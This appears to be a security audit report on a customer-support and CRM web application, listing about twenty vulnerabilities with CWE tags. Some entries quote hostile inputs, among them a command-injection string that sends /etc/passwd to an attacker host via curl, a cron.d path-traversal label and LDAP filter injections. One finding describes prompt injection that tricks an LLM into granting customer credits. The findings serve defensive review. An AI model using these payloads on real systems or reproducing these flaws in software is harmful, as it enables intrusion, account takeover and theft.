extra.message: issueGoodwillCredit() applies a monetary goodwill credit using only the path id and never loads the escalation through findOne() nor checks the caller's role/ownership. Any authenticated user (including a customer_contact) can set goodwillCreditAmount on any escalation by UUID. Contrast applyRetentionCredit(), which enforces role and ownership checks.

cwe: CWE-862: Missing Authorization
CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: saveRenewalSnapshot() joins the caller-supplied body field 'label' directly into a filesystem path with no basename/sanitization. A label such as '../../../../etc/cron.d/x' escapes the report-snapshots directory and writes attacker-controlled CSV content to an arbitrary path. The sibling saveEscalationsSnapshot() correctly applies path.basename().

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: convertRenewalsReport() interpolates the unvalidated request-body value 'format' into an execSync() shell command. A value such as 'pdf; curl http://attacker/$(cat /etc/passwd)' yields arbitrary OS command execution. The sibling convertHealthReport() validates against an allowlist and uses spawnSync with shell:false.

cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

extra.message: runDiagnosticReport() returns the raw exception message, full stack trace and internal query object to the caller whenever includeQueryContext is true, disclosing implementation details. The sibling runBacklogHealthCheck() only emits diagnostic detail when NODE_ENV is development, regardless of caller input.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: The password-reset token is generated with Math.random(), a non-cryptographic PRNG. The value is predictable/brute-forceable, so an attacker can guess a victim's reset code within its 30-minute window and take over the account. Use crypto.randomBytes().

cwe: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
CWE-330: Use of Insufficiently Random Values

extra.message: findStaffByEmail() interpolates the user-controlled 'email' query parameter into an LDAP filter without escaping. Input such as '*)(uid=*' or ')(|(cn=*' alters the search filter (LDAP injection), allowing enumeration of directory records. The sibling verifyEmployeeBadge() escapes with escapeDirectoryFilterValue().

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')

extra.message: searchStaffDirectory() interpolates the user-controlled 'q' query parameter into the LDAP filter '(cn=*${searchTerm}*)' without escaping, allowing LDAP injection to modify the query and enumerate arbitrary directory entries. The badge lookup in the same file demonstrates the correct escaping approach.

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')

extra.message: switchActiveWorkspace() sets the 'workspace_context' session identifier cookie without httpOnly, secure or sameSite attributes, so it is readable by client-side JavaScript and exposed over cleartext/CSRF. The support-console cookie in the same controller sets httpOnly/secure/sameSite:'strict'.

cwe: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute

extra.message: continueDocumentWorkflow() passes the user-controlled 'x-workflow-return-url' header straight to res.redirect() with no validation, allowing an attacker to redirect a victim to an arbitrary external site (open redirect / phishing). The escalation variant continueEscalationWorkflow() restricts the value to a fixed allowlist.

cwe: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

extra.message: unsealContractTerms() decrypts with AES-256-CBC (unauthenticated mode) and distinguishes a 'bad decrypt' padding failure from other errors, exposing a padding-oracle side channel that lets an attacker recover plaintext/tamper with sealed terms. The archived variant uses AES-256-GCM with an auth tag and a single generic error.

cwe: CWE-327: Use of a Broken or Risky Cryptographic Algorithm
CWE-353: Missing Support for Integrity Check

extra.message: getPartnerEmbedManifest() removes the X-Frame-Options header for enterprise organizations, allowing the response/page to be embedded in an attacker-controlled iframe (clickjacking). The customer-portal variant always sets X-Frame-Options: DENY.

cwe: CWE-1021: Improper Restriction of Rendered UI Layers or Frames

extra.message: recordActivityNote() writes the caller-supplied 'note' and 'action' values verbatim into the application log without stripping CR/LF, allowing forged log entries / log injection. The sibling recordStageChangeReason() strips [\r\n\0] before logging.

cwe: CWE-117: Improper Output Neutralization for Logs

extra.message: recordKeyIssuanceForSupportTicket() logs the full plaintext API key ('issuedKey: rawKey') together with the API key record and user object. Anyone with log access (support, log aggregation, backups) obtains a live credential. The rotation variant logs only non-secret fields (id, prefix, actor).

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: importDocumentFromExternalSource() calls fetch() on the fully user-controlled 'x-document-source-url' header with no scheme/host allowlist, enabling Server-Side Request Forgery against internal services (cloud metadata, localhost admin ports) and arbitrary file ingestion. The approved-repository variant validates the parsed hostname against a fixed allowlist.

cwe: CWE-918: Server-Side Request Forgery (SSRF)

extra.message: previewCustomOrganizationNotice() compiles the attacker-controlled 'messageTemplate' body field with Handlebars. Arbitrary template expressions/markup are rendered from user input (server-side template injection, and XSS if the preview is rendered as HTML). The sibling previewStandardRenewalNotice() uses a fixed template constant.

cwe: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: authenticateWorkspaceHandoff() is a @Public() endpoint that accepts an arbitrary caller-supplied sessionId and rebinds that existing session's userId to the authenticated caller (session.userId = user.id). Anyone who knows/obtains another user's workspace session id can adopt that session's workspaceOrganizationId (cross-tenant workspace access). The billing variant mints a brand-new session instead of reusing the caller-supplied one.

cwe: CWE-384: Session Fixation
CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: draftFollowupReply() interpolates the customer-controlled 'customerFollowUp' into the LLM prompt and then applies a goodwill credit based solely on a regex match against the model's free-text output (CREDIT_APPROVED: <amount>), with no staff authorization or confirmation. A customer can craft their follow-up to induce the model to emit the directive and grant themselves an arbitrary credit.

extra.message: The public register() flow accepts an arbitrary 'organizationId' from the request body and assigns it to the newly created user. Because contacts/deals/escalations/documents/api-keys/webhooks are scoped by the caller's organizationId, a self-registered user can bind themselves to any organization UUID and read that tenant's data.

extra.message: findOne() (reachable via GET /users/:id, which has no @Roles restriction) only blocks account managers and returns the full User entity, including passwordHash and passwordResetCode, to any authenticated user (customer_contact/support_agent). This exposes credential material that enables offline cracking and reset-code abuse.

Any authenticated user can modify any organization's name, renewal date, billing contacts and notes, unlike updateHealth/syncBillingProfile which enforce access.

CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: updateStatus() (PATCH /organizations/:id/status) changes an organization's status (suspend/activate/cancel) without calling assertOrganizationAccess() or requiring a privileged role. Any authenticated user can disable or reactivate any tenant.

CWE-639: Authorization Bypass Through User-Controlled Key
